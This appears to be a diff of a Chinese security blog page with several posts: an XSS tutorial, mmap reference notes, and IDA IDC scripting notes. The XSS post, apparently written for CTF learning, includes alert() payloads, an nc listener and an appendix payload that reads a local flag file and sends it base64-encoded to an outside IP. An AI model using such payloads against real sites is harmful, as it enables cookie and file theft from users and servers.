class="string">"%Y-%m-%d %X"</span>, time.localtime())</div></pre></td></tr></table></figure>
-<p>上面的代码通过setkey模拟登录，然后设置后台的cookie，每次payload执行2次，然后清理掉admin除预留信息以外的所有payload，避免恶意payload导致的所有payload无效。</p>
-<p>配合crontab可以保证bot的持久性，如果不放心bot的稳定性，还可以在脚本执行结束后，执行命令kill掉所有的firefox残留进程。</p>
-<p>到此为止，一个完整的xss bot就完成了，虽然可能不是最完美的解决方案，希望会有更好的解决办法:&gt;</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/web/xss简介/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/21/web/xss简介/" itemprop="url">xss简介</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T16:24:13+08:00">
-                2017-09-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>自从xss被发现之后，OWASP上经常会出现它的身影。一开始xss作为一种攻击方式，应用并不算广。但是随着漏洞利用的深入钻研，安全研究者们逐渐发现xss的危害，特别是在用户授权与管理方面。</p>
-<p>国内外各大web安全检测厂商，已经在其产品中加入了xss检查、过滤等功能。</p>
-<h3 id="1、XSS原理"><a href="#1、XSS原理" class="headerlink" title="1、XSS原理"></a>1、XSS原理</h3><p>JavaScript可以用来获取用户的Cookie、改变网页内容、URL跳转。于是，我们就可以从存在XSS漏洞的网站中，盗取用户Cookie、黑掉页面、导航到恶意网站。</p>
-<p>通常使用<script src="http://www.secbug.org/x.txt"></script>方式来加载外部脚本，而在x.txt中就存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。</p>
-<p>备注：JavaScript加载外部的代码文件可以是任意扩展名(无扩展名也可以)</p>
-<h3 id="2、XSS类型"><a href="#2、XSS类型" class="headerlink" title="2、XSS类型"></a>2、XSS类型</h3><h4 id="2-1-反射型XSS"><a href="#2-1-反射型XSS" class="headerlink" title="2.1 反射型XSS"></a>2.1 反射型XSS</h4><p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。</p>
-<p>XSS的Payload一般是写在URL中，之后设法让被害者点击这个链接。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">     username = _GET[<span class="string">'username'</span>];  </div><div class="line">     <span class="keyword">echo</span> $username;  </div><div class="line"><span class="meta">?&gt;</span>  </div><div class="line"> </div><div class="line">利用样例：</div><div class="line">http:<span class="comment">//www.secbug.org/xss.php?username=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
-<h4 id="2-2-存储型XSS"><a href="#2-2-存储型XSS" class="headerlink" title="2.2 存储型XSS"></a>2.2 存储型XSS</h4><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。</p>
-<p>存储型XSS被服务器端接收并存储，当用户访问该网页时，这段XSS代码被读出来响应给浏览器。</p>
-<p>反射型XSS与DOM型XSS都必须依靠用户手动去触发，而存储型XSS却不需要。</p>
-<p>测试步骤如下，以留言板为例：</p>
-<p>（1）添加正常的留言，使用Firebug快速寻找显示标签</p>
-<p>（2）判断内容输出（显示）的地方是在标签内还是在标签属性内，或者在其他地方。如果显示区域不在HTML属性内，则可以直接使用xss代码注入。如果在属性内，需要先闭合标签再写入xss代码。如果不能得知内容输出的具体位置，则可以使用模糊测试方案。</p>
-<p>（3）在插入xss payload代码后，重新加载留言页面，xss代码被浏览器执行。</p>
-<h4 id="2-3-DOM-XSS"><a href="#2-3-DOM-XSS" class="headerlink" title="2.3 DOM XSS"></a>2.3 DOM XSS</h4><p>DOM的全称为Document Object Model，即文档对象模型。</p>
-<p>基于DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段。简单理解DOM XSS就是出现在javascript代码中的xss漏洞。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;  </div><div class="line"><span class="keyword">var</span> temp = document.URL;<span class="comment">//获取URL  </span></div><div class="line"><span class="keyword">var</span> index = document.URL.indexOf(<span class="string">"content="</span>)+<span class="number">4</span>;  </div><div class="line"><span class="keyword">var</span> par = temp.substring(index);  </div><div class="line">document.write(decodeURI(par));<span class="comment">//输入获取内容  </span></div><div class="line">&lt;/script&gt;  </div><div class="line"></div><div class="line">利用样例：</div><div class="line">http:<span class="comment">//www.secbug.org/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
-<p>这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。</p>
-<p>反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。</p>
-<h3 id="3、利用工具"><a href="#3、利用工具" class="headerlink" title="3、利用工具"></a>3、利用工具</h3><h4 id="3-1-xss接收工具"><a href="#3-1-xss接收工具" class="headerlink" title="3.1 xss接收工具"></a>3.1 xss接收工具</h4><p>谈到xss的利用工具，这里不得不提到火日大神，其在github上的工具<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
-<p>这个工具是ctf中xss应用的经典工具</p>
-<p><strong>另外一个工具就是nc</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> nc -l -p 8080</div><div class="line">GET /1.jpg HTTP/1.1</div><div class="line">Host: 10.254.20.127:8080</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh,zh-CN;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
-<p>当外界请求<a href="http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。" target="_blank" rel="external">http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。</a></p>
-<h4 id="3-2-xss检测工具"><a href="#3-2-xss检测工具" class="headerlink" title="3.2 xss检测工具"></a>3.2 xss检测工具</h4><p>xss检测工具很多，现在xsser、xssf</p>
-<p>说真的，两个检测工具不怎么好用，还不如手工呢！</p>
-<p>另外就是xssor，可以访问</p>
-<p><a href="https://github.com/evilcos/xssor2" target="_blank" rel="external">https://github.com/evilcos/xssor2</a></p>
-<p><a href="http://xssor.io/" target="_blank" rel="external">http://xssor.io/</a></p>
-<h3 id="4、附录"><a href="#4、附录" class="headerlink" title="4、附录"></a>4、附录</h3><p>xss一般请求方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?evilcode=&lt;script&gt;&lt;img src=&quot;http://xxxx/xss.jpg&quot;/&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?evalcode=&lt;script&gt;var xmlhttp= new XMLHttpRequest();xmlhttp.open(&quot;GET&quot;,&quot;file:///var/www/html/flag.php&quot;,true);xmlhttp.onload = function () &#123;content = btoa(xmlhttp.responseText);window.location.href=&quot;http://118.190.78.155:8080/index.php?a=&quot;%2bcontent;&#125;;xmlhttp.send(null);&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>btoa(&quot;str&quot;)   ===&gt;  base64加密字符串</p>
-<p>atob(&quot;ABSCRF==&quot;)    ===&gt;  base64解密字符串</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/19/code/Linux内存映射函数mmap函数详解/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/19/code/Linux内存映射函数mmap函数详解/" itemprop="url">Linux内存映射函数mmap函数详解</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-19T15:48:19+08:00">
-                2017-09-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/code/" itemprop="url" rel="index">
-                    <span itemprop="name">code</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>mmap将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。</p>
-<h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><blockquote>
-<p>void<em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset);</p>
-<p>int munmap(void* start,size_t length);</p>
-</blockquote>
-<p>mmap 必须以PAGE_SIZE为单位进行映射，而内存也只能以页为单位进行映射，若要映射非PAGE_SIZE整数倍的地址范围，要先进行内存对齐，强行以PAGE_SIZE的倍数大小进行映射。</p>
-<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>下面说一下内存映射的步骤:</p>
-<ol>
-<li>用open系统调用打开文件, 并返回描述符fd.</li>
-<li>用mmap建立内存映射, 并返回映射首地址指针start.</li>
-<li>对映射(文件)进行各种操作, 显示(printf), 修改(sprintf)</li>
-<li>用munmap(void *start, size_t length)关闭内存映射.</li>
-<li>用close系统调用关闭文件fd.</li>
-</ol>
-<h3 id="mmap函数的主要用途"><a href="#mmap函数的主要用途" class="headerlink" title="mmap函数的主要用途"></a>mmap函数的主要用途</h3><p>1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；</p>
-<p>2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；</p>
-<p>3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。</p>
-<h3 id="mmap函数说明"><a href="#mmap函数说明" class="headerlink" title="mmap函数说明"></a>mmap函数说明</h3><p><strong>参数start</strong></p>
-<p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p>
-<p><strong>参数length</strong></p>
-<p>代表将文件中多大的部分映射到内存。</p>
-<p><strong>参数prot</strong></p>
-<p>映射区域的保护方式。可以为以下几种方式的组合：</p>
-<p>PROT_EXEC 映射区域可被执行</p>
-<p>PROT_READ 映射区域可被读取</p>
-<p>PROT_WRITE 映射区域可被写入</p>
-<p>PROT_NONE 映射区域不能存取</p>
-<p><strong>参数flags</strong></p>
-<p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p>
-<p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此标志。</p>
-<p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p>
-<p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p>
-<p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p>
-<p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p>
-<p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p>
-<p><strong>参数fd</strong></p>
-<p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</p>
-<p><strong>参数offset</strong></p>
-<p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</p>
-<p><strong>返回值</strong></p>
-<p>若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。</p>
-<p><strong>错误代码</strong></p>
-<p>EBADF  参数fd不是有效的文件描述词</p>
-<p>EACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用</p>
-<p>MAP_SHARED则要有PROT_WRITE以及该文件要能写入。</p>
-<p>EINVAL 参数start、length 或offset有一个不合法。</p>
-<p>EAGAIN 文件被锁住，或是有太多内存被锁住。</p>
-<p>ENOMEM 内存不足。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/tools/IDA的调试脚本idc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/18/tools/IDA的调试脚本idc/" itemprop="url">IDA的调试脚本idc</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T21:30:24+08:00">
-                2017-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>IDA的脚本有两种，一种是idc，另一种是IDAPython。</p>
-<p>可以通过File-&gt;Script file；File-&gt;Script command访问IDA的脚本引擎。</p>
-<h2 id="1、IDC语言"><a href="#1、IDC语言" class="headerlink" title="1、IDC语言"></a>1、IDC语言</h2><h3 id="1-1-IDC变量"><a href="#1-1-IDC变量" class="headerlink" title="1.1 IDC变量"></a>1.1 IDC变量</h3><p>IDC的3种数据类型：整数（IDA文档使用类型名称long）、字符串和浮点值。当然也包括对象、引用和函数指针</p>
-<h4 id="1-1-1-局部变量声明"><a href="#1-1-1-局部变量声明" class="headerlink" title="1.1.1 局部变量声明"></a>1.1.1 局部变量声明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">auto addr, reg, val;	//legal, multiple variables declared with no initializers</div><div class="line">auto count = 0;			// declaration with initialization</div></pre></td></tr></table></figure>
-<p>IDC认可使用/**/的C风格多行注释，//的行注释</p>
-<h4 id="1-1-2-全局变量声明"><a href="#1-1-2-全局变量声明" class="headerlink" title="1.1.2 全局变量声明"></a>1.1.2 全局变量声明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">extern outsideGlobal;</div><div class="line">static main()&#123;</div><div class="line">	extern insideGlobal;</div><div class="line">	outsideGlobal = &quot;Global&quot;;</div><div class="line">	insideGlobal = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>可以在函数内部或外部声明全部变量，但不能子啊声明变量的时候提供初始值。</p>
-<h3 id="1-2-IDC表达式"><a href="#1-2-IDC表达式" class="headerlink" title="1.2 IDC表达式"></a>1.2 IDC表达式</h3><p>除了少数几个特例外，IDC几乎支持C的所有算数和逻辑运算符，包括三元运算(?:)，但是不支持op=（+=、*=、&gt;&gt;=等）形式的符合赋值运算符。</p>
-<p>IDC的字符串运算与C的有所不同。在IDC中，支持类python的字符串复制、拼接、分片操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto str=&quot;String to slice&quot;;</div><div class="line">auto s1,s2,s3,s4;</div><div class="line">s1 = str[7:9];</div></pre></td></tr></table></figure>
-<p>需要注意的是IDC没有数组数据类型。</p>
-<h3 id="1-3-IDC语句"><a href="#1-3-IDC语句" class="headerlink" title="1.3 IDC语句"></a>1.3 IDC语句</h3><p>IDC的语句以很好结束。switch语句是IDC唯一不支持的C风格复合语句。在使用for循环的时候，需要记住的是，IDC不支持复合赋值运算符op=。</p>
-<p>并且IDC引入了try/catch块和相关的switch语句，在语法上它们类似C++一场处理。</p>
-<p>IDC的块中，可以声明新的变量，只要变量声明位于花括号内的第一个语句即可。但是IDC并不严格限制新引入的变量的作用范围，因此，你可以在声明这些变量的花括号以外引用它们。</p>
-<h3 id="1-4-IDC函数"><a href="#1-4-IDC函数" class="headerlink" title="1.4 IDC函数"></a>1.4 IDC函数</h3><p>IDC仅仅在独立程序(.idc文件)中支持用户定义的函数。iDC命令对话框不支持用户定义的函数。IDC用于声明用户定义的函数的语法与C语言的差异甚大。在IDC中，static关键字用于引入一个用户定义的函数，函数的参数列表仅包含一个以逗号分隔的参数名列表。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">static my_func(x, y, z)&#123;</div><div class="line">  auto a,b,c;</div><div class="line">  ......  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>并且参数可以采用传值或者传参的方式。</p>
-<p>现在已经可以将函数引用作为一个参数传递给另一个函数，并将函数引用作为函数的返回结果。下面的代码清单说明了使用函数参数和函数作为返回值的情况。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static getFunc()&#123;</div><div class="line">  return Message; //return the built-in Message function as a result</div><div class="line">&#125;</div><div class="line">static useFunc(func, arg)&#123;</div><div class="line">  func(arg);  // func here is expected to be a function reference</div><div class="line">&#125;</div><div class="line">static main()&#123;</div><div class="line">  auto f = getFunc();  </div><div class="line">  f(&quot;Hello world!\n&quot;);  // invoke the returned function f</div><div class="line">  useFunc(f, &quot;XXS&quot;);	// no need for &amp; operator, functions always call-by-reference</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="1-5-IDC对象"><a href="#1-5-IDC对象" class="headerlink" title="1.5 IDC对象"></a>1.5 IDC对象</h3><p>IDC定义了一个成为object的根类，最终所有类都是由它衍生而来，并且在创建新类时支持单一继承。IDC并不使用访问说明符，如public或private，所有类成员均为有效公共类。类声明仅包含类成员函数的定义。要在类中创建数据成员，只需要创建一个给数据成员赋值的赋值语句即可。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">class ExampleClass&#123;</div><div class="line">  ExampleClass(x,y)&#123; // constructor</div><div class="line">    this.a = x;	// all ExampleClass objects hava data member a</div><div class="line">    this.b = y;	// all ExampleClass objects hava data member b</div><div class="line">  &#125;</div><div class="line">  ~ExampleClass()&#123;  // destructor</div><div class="line">  &#125;</div><div class="line">  foo(x)&#123;</div><div class="line">    this.a = this.a + x;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">staic main()&#123;</div><div class="line">  /* ExampleClass ex;*/ // this is not a valid variable declaration</div><div class="line">  auto ex = ExampleClass(1,2);	// this is right</div><div class="line">  ex.foo(10);</div><div class="line">  ex.z = &quot;string&quot;;	// object ex now has a member z, BUT class does not</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="1-6-IDC程序"><a href="#1-6-IDC程序" class="headerlink" title="1.6 IDC程序"></a>1.6 IDC程序</h3><p>需要有主函数，并且主程序文件还必须包含idc.idc文件以获得它包含的有用宏定义。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#include &lt;idc.idc&gt;	// useful include directive</div><div class="line">static main()&#123;</div><div class="line">  // do something</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>IDC认可的预处理指令</p>
-<ul>
-<li>#include &lt;文件&gt;</li>
-<li>#define&lt;宏名称&gt;[可选值]      创建一个宏，可以选择给它分配指定的值。IDC预定义了许多宏来测试脚本执行环境，如\<em>NT\</em>、\<em>LINUX\</em>、\<em>MAC\</em>、\<em>GUI\</em>、\<em>TXT\</em></li>
-<li>#ifdef&lt;名称&gt;  测试指定的宏是否存在，如果存在，可以选择处理其后的任何语句</li>
-<li>#else  与上面的#ifdef配合使用</li>
-<li>#endif</li>
-<li>#undef&lt;名称&gt;  删除指定宏</li>
-</ul>
-<h3 id="1-7-IDC错误处理"><a href="#1-7-IDC错误处理" class="headerlink" title="1.7 IDC错误处理"></a>1.7 IDC错误处理</h3><p>运行IDC脚本时，可能遇到两种错误：解析错误、运行时错误。</p>
-<p>解析错误指的是令程序无法运行的错误，包括语法错误、引用未定义变量、函数参数数量错误等。</p>
-<p>运行时错误会使一段脚本立即终止运行。当然，当一个脚本运行时间过长，也会发生运行时错误。</p>
-<p>调试IDC脚本很麻烦，除了大量使用输出语句外，没有其他办法调试IDC脚本。</p>
-<h3 id="1-8-IDC永久数据存储"><a href="#1-8-IDC永久数据存储" class="headerlink" title="1.8 IDC永久数据存储"></a>1.8 IDC永久数据存储</h3><p>前面提到IDC没有传统意义上的数据，即声明一个大型存储块，然后使用下标访问块中的数据项的数组。但是IDC确实有全局永久数组，这可以看成已命名的永久对象，而且这些对象是稀疏数组。数组中的同时保存一个整数值和一个字符串值，IDC的全局数组无法存储浮点值。</p>
-<ul>
-<li>long CreateArray(string name)   返回数组句柄</li>
-<li>long GetArrayId(string name)  返回索引句柄</li>
-<li>long SetArrayLong(long id, long idx, long value)  将整数value存储到数组id中idx位置</li>
-<li>long SetArrayString(long id, long idx, string str)</li>
-<li>string or long GetArrayElement(long tag, long id, long idx)  提取的是整数还是字符串，有tag参数的值决定，必须是常量AR_LONG（整数）或AR_STR（字符串）</li>
-<li>long DelArrayElement(long tag, long id, long idx)</li>
-<li>void DeleteArray(long id) 删除句柄id对应的数组</li>
-<li>long RenameArray(long id, string newname)</li>
-</ul>
-<h2 id="2、IDC的常用函数"><a href="#2、IDC的常用函数" class="headerlink" title="2、IDC的常用函数"></a>2、IDC的常用函数</h2><h3 id="2-1-读取和修改数据的函数"><a href="#2-1-读取和修改数据的函数" class="headerlink" title="2.1 读取和修改数据的函数"></a>2.1 读取和修改数据的函数</h3><ul>
-<li>long Byte(long addr)      从虚拟地址addr中读取一个字节值</li>
-<li>long Word(long addr)      从虚拟地址addr中读取一个字（2字节）值</li>
-<li>long Dword(long addr)      从虚拟地址addr中读取一个双字（4字节）值</li>
-<li>void PatchByte(long addr, long val)   设置虚拟地址addr处的一个字节值</li>
-<li>void PatchWord(long addr, long val)   设置虚拟地址addr处的一个字值</li>
-<li>void PatchDword(long addr, long val)   设置虚拟地址addr处的一个双字值</li>
-<li>bool isLoaded(long addr)   如果addr包含有效数据，则返回1，否则0</li>
-</ul>
-<p>需要注意的是，我们在做这种操作的时候应该考虑字节顺序。</p>
-<h3 id="2-2-用户交互函数"><a href="#2-2-用户交互函数" class="headerlink" title="2.2 用户交互函数"></a>2.2 用户交互函数</h3><ul>
-<li>void Message(string format, ...)   格式化打印。接受printf风格的格式化字符串</li>
-<li>void print(...)   在输出窗口打印每个参数的字符串表示形式</li>
-<li>void Wording(string format, ...)   对话框中显示一条格式化信息</li>
-<li>string AskStr(string default, string prompt)  显示一个输入框，要求用户输入一个额字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0</li>
-<li>string AskFile(long doSave, string mask, string prompt)  显示一个文件选择对话框，以简化选择文件的任务。新文件保存数据(doSave=1)，或选择现有的文件读取数据(doSave=0)。可以根据mask（如*.*或*.idc）过滤显示的文件列表。如果操作成功，则会返回选定文件的名称；如果对话框被取消，返回0</li>
-<li>string AskYN(long default, string prompt)  用是或否的问题提示用户。突出一个默认的答案（1为是，0为否，-1为取消）。返回值是一个选定答案的整数。</li>
-<li>long ScreenEA()   返回当前光标所在位置的虚拟地址</li>
-<li>bool Jump(long addr)  跳转到反汇编窗口的指定地址</li>
-</ul>
-<h3 id="2-3-字符串操纵函数"><a href="#2-3-字符串操纵函数" class="headerlink" title="2.3 字符串操纵函数"></a>2.3 字符串操纵函数</h3><ul>
-<li>string form(string format, ...)   //preIDA5.6  类似c语言的sprintf函数，返回一个新年字符串，该字符串根据所提供的格式化字符串和值进行格式化</li>
-<li>string sprintf(string format, ...)  //IDA5.6+  sprintf用于替代form</li>
-<li>long atol(string val)   将十进制值val转化成对应的整数值</li>
-<li>long xtol(string val)  将十六进制值val（可选择以0x开头）转换成对应的整数值</li>
